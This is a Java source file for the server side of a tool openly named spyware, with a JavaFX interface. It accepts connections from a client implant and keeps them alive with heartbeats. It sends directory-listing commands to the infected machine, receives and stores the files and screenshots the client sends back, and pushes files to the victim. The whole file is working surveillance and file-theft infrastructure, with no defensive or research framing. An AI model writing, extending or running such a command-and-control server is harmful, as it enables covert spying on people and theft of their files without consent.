package com.example.spyware_server_fx;

import javafx.application.Platform;
import javafx.scene.paint.Color;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Scanner;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.*;
import java.util.Scanner;

public class SpywareServer {
    final int port;
    final String endIdentifier = "<end>";
    public ServerSocket serverSocket;

    public OutputStream outputStream = null;
    public InputStream inputStream = null;
    public Socket clientSocket = null ;
    public ObjectInputStream objectInputStream;
    public HelloController helloController;

    public boolean is_socket_free = true;
    public String directoryName = "downloadedFiles";
    public String screenshotsDirectoryName = "screenshots";
    public Thread socketThread;

    public SpywareServer(int port , HelloController helloController) throws Exception {
        if(port > 2000)
            this.port = port;
        else
            this.port = 8080;
        this.helloController = helloController;


                    serverSocket = new ServerSocket(port);
                    System.out.println(getServerStartedMessage());
                    helloController.cmd_controller.appendlnOutputCmdText(getServerStartedMessage());

                    //statrt the thread
        try {
            socketThread = new Thread(new Runnable() {
                public void run() {
                    while (!serverSocket.isClosed()) {
                        try {
                            System.out.println("waiting for incoming connection");
                            helloController.cmd_controller.appendlnOutputCmdText("\nWaiting for incoming connection");
                            clientSocket = serverSocket.accept();

                            // handle client connection
                            System.out.println(getClientConnectedMessage());
                            helloController.cmd_controller.appendlnOutputCmdText(getClientConnectedMessage());
//                            helloController.live_indicator.setImage(helloController.live_image);
                            helloController.live_indicator.setFill(new Color(0.0,1.0,0.0 , 1));

                            outputStream = clientSocket.getOutputStream();
                            inputStream = clientSocket.getInputStream();
                            objectInputStream = new ObjectInputStream(inputStream);
                            is_socket_free = true;


                            // show data in gui by getting directories
                            helloController.gui_controller.getAndShowData();

                            byte[] bytes = ("is_connected" + endIdentifier).getBytes();
                            while (!clientSocket.isClosed()) {
                                if (is_socket_free) {
                                    is_socket_free = false;
                                    System.out.println("Socket free Testing if client is alive");
                                    outputStream.write(bytes);
                                    try {
                                        String response = receiveData(inputStream);
                                        System.out.println("Response for socket's testing : " + response);
                                        if (!response.startsWith("alive"))
                                            throw new Exception("");
                                        else
                                            System.out.println("Connection is alive");
                                    } catch (Exception e) {
                                        System.out.println("failed to read response for signal <is_connected>");
                                        clientSocket.close();
                                    }
                                    is_socket_free = true;
                                } else
                                    System.out.println("Socket not free");
                                try {
                                    Thread.sleep(1000);
                                } catch (Exception e) {
                                    System.out.println(e.getMessage());
                                }

                            }

                        } catch (IOException e) {
                            // handle exception
                            System.out.println(e.getMessage());
                            System.out.println("client disconnected. Socket closing...");
                            try {
                                clientSocket.close();
                            } catch (Exception err) {
                                System.out.println(err.getMessage());
                                System.out.println("Failed to close client socket");
                            }
                        } finally {
                            System.out.println("Client Socket closed");
                            is_socket_free = true;
                            try{
                            helloController.cmd_controller.appendlnOutputCmdText("\n" + clientSocket.getInetAddress() + " disconnected on port " + port);
                            }
                            catch (Exception e){
                                System.out.println("Failed to get client Address \n" + e.getMessage());
                            }
//                            helloController.live_indicator.setImage(helloController.offline_image);
                            helloController.live_indicator.setFill(Color.RED);
                            Platform.runLater(new Runnable() {
                                @Override
                                public void run() {
                                    helloController.gui_controller.showData(new ArrayList<File>());
                                }
                            });
                        }
                    }
                    System.out.println("Inside server Thread... server socket closed ... thread is terminating");
                }
            });

            socketThread.start();
        }
        catch (Exception e){
            System.out.println("Server Socket Thread Interuppted");
        }
    }

    public String getServerStartedMessage(){
        return "Server " + serverSocket.getInetAddress() + " started on port " + port;
    }
    public String getClientConnectedMessage(){
        return "Client connected from " + clientSocket.getInetAddress().getHostAddress();
    }
    public String receiveData(InputStream inputStream) throws Exception{
        // read data from the socket input stream
        byte[] buffer = new byte[1024];
        String receivedData = "";
        int bytesRead = 0;
        while (true) {
            bytesRead = inputStream.read(buffer, 0, buffer.length);
            if (bytesRead == -1) {
                break;
            }
            receivedData += new String(buffer, 0, bytesRead);
            if (receivedData.contains(endIdentifier)) {
                break;
            }
        }

        // process the received data
        receivedData = receivedData.trim();
        receivedData = receivedData.substring(0 , receivedData.length() - endIdentifier.length() );
        return receivedData;
    }

    public void receiveAndSaveFile(String filePath ) throws Exception{
        File file = new File(filePath);
        String filename = file.getName();

        // create directory if it doesn't exist
        File directory = new File(directoryName);
        if (!directory.exists()) {
            directory.mkdir();
        }
        // create directory if it doesn't exist
        directory = new File(directoryName+File.separator+screenshotsDirectoryName);
        if (!directory.exists()) {
            directory.mkdir();
        }

        // get complete file path
        Path new_filePath = null;
        if(filename.endsWith("png"))
            new_filePath = Paths.get(directoryName , screenshotsDirectoryName, filename);
        else new_filePath = Paths.get(directoryName, filename);
        String fullPath = new_filePath.toString();
        System.out.println(fullPath); // prints "myDirectory\myFile.txt"

        FileOutputStream fos = new FileOutputStream(fullPath);
        byte[] buffer = new byte[1024];
        int bytesRead;
        System.out.println("Receving file");
//        boolean is_eof_received = false;
        while ((bytesRead = inputStream.read(buffer)) != -1) {
            String receivedData = new String(buffer, 0, bytesRead);
            if(receivedData.endsWith(endIdentifier)){
                break;
//                is_eof_received = true;
//                receivedData = receivedData.substring(0,receivedData.length() - endIdentifier.length());
            }
            fos.write(buffer, 0, bytesRead);
//                break;
        }
        System.out.println("File saved to current program directory");
//        String outputText = "File saved to " + System.getProperty("user.dir")+"\\"+filename;
        String outputText = "File saved to " + System.getProperty("user.dir")+"\\"+new_filePath;
        helloController.cmd_controller.appendlnOutputCmdText(outputText);
        // Close the file
        fos.close();
    }
//    public void receiveAndSaveScreenshot( ) throws Exception{
//
//        // generate file name
//        LocalDateTime now = LocalDateTime.now();
//        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss");
//        String fileName = "screenshot_" + formatter.format(now) + ".png";
//
//        byte[] imageData = (byte[]) objectInputStream.readObject();
//
//        // Save the image data to a file
//        FileOutputStream fos = new FileOutputStream(fileName);
//        fos.write(imageData);
//        fos.close();
//
//        String outputText = "Screenshot saved to " + System.getProperty("user.dir")+"\\"+fileName;
//        helloController.cmd_controller.appendlnOutputCmdText(outputText);
//        System.out.println("Screenshot saved");
//    }

    public ArrayList<File> getFilesList(){
        System.out.println("getFilesList() called");

        while (!is_socket_free){
            System.out.println("Socket not free for getFilesList()");
            try{
                Thread.sleep(500);
            }
            catch (Exception e){
                System.out.println(e.getMessage());
            }
        }

        try {
            helloController.cmd_controller.inputField.setEditable(false);
            helloController.cmd_controller.sendBtn.setDisable(true);

            String command_original = "dir_gui";
            String command = command_original + endIdentifier;
            is_socket_free = false;
            System.out.println("Sending dir_gui command inside getFilesList() : " );
            outputStream.write(command.getBytes());
            // now wait for cmd result

            System.out.println("waiting for result of dir_gui");
            Object obj = objectInputStream.readObject();
            is_socket_free = true;

            if(obj instanceof ArrayList)
            {
                System.out.println("Obj can be casted");
            }
            else
                System.out.println("Obj cannot be casted to Array List");
            ArrayList<File> filesList = (ArrayList<File>) obj;

            helloController.cmd_controller.inputField.setEditable(true);
            helloController.cmd_controller.sendBtn.setDisable(false);

            for (File file : filesList) {
                if (file.isFile()) {
                    System.out.println("File: " + file.getName());
                } else if (file.isDirectory()) {
                    System.out.println("Folder: " + file.getName());
                }
            }

            return filesList;
        }
        catch (Exception e){
            System.out.println(e.getMessage());
            is_socket_free = true;
            return new ArrayList<File>();
        }
    }

    public void closeClient() {
        System.out.println("Closing client");
        try {
            if (inputStream != null)
                inputStream.close();
        }
        catch (Exception e) {
            System.out.println("Failed to close input stream");
            System.out.println(e.getMessage());
        }
        try {
            if (outputStream != null)
                outputStream.close();
        }
        catch (Exception e){
            System.out.println("Failed to close output stream");
            System.out.println(e.getMessage());
        }
        try {
            if (objectInputStream != null)
                objectInputStream.close();
        }
        catch (Exception e){
            System.out.println("Failed to close object Input stream");
            System.out.println(e.getMessage());
        }
        try{
            if(clientSocket != null)
                clientSocket.close();
        }
        catch (Exception e){
            System.out.println("Failed to close client socket");
            System.out.println(e.getMessage());
        }
    }

    void closeServer() throws IOException{
//        socketThread.interrupt();
 closeClient();
        System.out.println("closing server");
        serverSocket.close();
        System.out.println("After server socket.close()");
    }
    public static byte[] readFileBytes(String filePath) throws Exception{
        File file = new File(getAbsoluteFilePath(filePath));
        byte[] fileBytes = new byte[(int) file.length()];
        FileInputStream fis = new FileInputStream(file);
        fis.read(fileBytes);
        fis.close();

        return fileBytes;
    }
    public static String getAbsoluteFilePath(String filePath){
        Path path = Paths.get(filePath);
        File file;

        if (path.isAbsolute()) {
            file = new File(filePath);
        } else {
            file = new File(System.getProperty("user.dir"), filePath);
        }
        System.out.println("Reading file : "+ file.getAbsolutePath());
        return file.getAbsolutePath();
    }
    public void sendFile(byte[] fileBytes , String filePath  , Boolean temp ) throws IOException{
        String sendingCommand = "<sending_file> "+filePath;
        if(temp)
            sendingCommand += " <temp> ";
        outputStream.write((sendingCommand+endIdentifier).getBytes());
        outputStream.flush();
        System.out.println("Sending file");
        try {
            System.out.println("Sleeping");
            Thread.sleep(500);
        }
        catch (Exception e){
            System.out.println("Failed to sleep for 500ms");
        }
        outputStream.write(fileBytes);
        try {
            Thread.sleep(500);
        }
        catch (Exception e){
            System.out.println("Failed to sleep for 500ms");
        }
        outputStream.write(endIdentifier.getBytes());
        System.out.println("File sent");
    }

}
